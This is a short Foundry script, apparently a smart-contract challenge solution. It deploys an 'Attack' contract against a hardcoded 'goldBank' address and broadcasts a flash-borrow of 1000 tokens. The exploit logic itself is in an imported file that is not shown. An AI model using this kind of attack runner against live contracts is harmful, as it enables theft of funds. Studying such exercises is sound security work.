// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {SharkVault, Attack} from "../src/Rekt.sol";

contract PuzzleWalletScript is Script {
    address goldBank = 0xfCb668c2108782AC6B0916032BD2aF5a1563E65D;
    address gold = 0x41a23DBF52be3060Fa0910d6AA0F9f2D463E387c;
    address seaGold = 0x8fd03562Ffa407d478F481be4498A4dccdc4e03f;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Attack attacker = new Attack(goldBank);
        attacker.flashBorrow(gold, 1000 * decimals());

        vm.stopBroadcast();
    }

    function decimals() public returns(uint256) {
        return (10**18);
    }
}